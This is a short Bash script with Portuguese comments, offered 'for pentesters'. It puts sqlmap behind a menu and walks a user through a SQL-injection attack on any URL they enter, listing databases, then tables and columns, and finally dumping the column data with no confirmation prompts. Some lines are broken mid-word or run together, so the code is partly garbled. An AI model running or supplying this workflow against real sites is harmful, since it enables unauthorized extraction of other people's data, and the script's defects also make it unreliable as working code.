#! /bin/bash
#Script Coded By: Bob ( Maryen Security )
#Script para pentesters (uso educacional ou testes)
#Não me responsabilizo por mal uso !
#
#
#
#
clear
apt-get install figlet > /dev/null

clear
#BANNER
figlet sqlmap

echo "                   @B4k4-S4N"

#Menu
menu() {
echo "\033[1;36m====================================="
echo "=                                   ="
echo "=     \033[1;31m[\033[1;31m1]>> \033[1;33mInstalar SQLMAP  \033[1;36m       ="
echo "=     \033[1;31m[\033[1;31m2]>> \033[1;33mUsar Sql-Automatico  \033[1;36m   ="
echo "=     \033[1;31m[\033[1;31m3]>> \033[1;33mSair do script \033[1;36m         ="
echo "\033[1;36m=                                   ="
echo "\033[1;36m====================================="
#
#Escolher entre 1 a 3
#obrigado por usar 
echo
read -p "[SqlAuto]>> " opcao
#
#Instala sqlmap
case $opcao in
	1) echo "\n\n\033[1;33mInstalando sqlmap ...";sleep 2
git clone https://github.com/sqlmapproject/sqlmap                   echo "\n\033[1;36mSqlmap instalado com sucesso !";sleep 2 ; clear ; menu ;;		
	2) clear ; cd $HOME ; cd sqlmap
echo "\033[1;32m\n\n[+]=> INICIANDO SQLMAP AUTOMATICO...";sleep 2
#digite a url do site
echo
echo "\033[1;36m\n[+]=> DIGITE A URL PARA O SQLMAP\033[1;31m"
echo
read -p "[+]>> " url
python2 sqlmap.py -u $url --risk 2 --level 2 --batch --dbs
#digita a database
echo "\033[1;36m[+]=> DIGITE O NOME DA >DATABASE<\033[1;31m"
echo
read -p "[db]>> " db
#Começa a listar as tabela
python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db --tables
#
#Read para digitar o nome da tabela
echo "\033[1;36m[+]=> DIGITE O NOME DA TABELA\033[1;31m"
echo
read -p "[Tabela]>> " tabela
#
#Começa a listar as colunas
python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabe
la --columns
#
#Read para digitar o nome da coluna
echo "\033[1;36m[+]=> DIGITE O NOME DA COLUNA\033[1;31m"
echo
read -p "[coluna]=> " coluna
#
#Extrai todo o trabalho feito
python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabe
la -C $coluna --dump
;;
	3) echo "SAINDO..." ; sleep 2 ; exit ;;

	*) echo "opcao invalida voltando para o menu" ; sleep 1 ; clear ; menu ;;
esac
}
menu

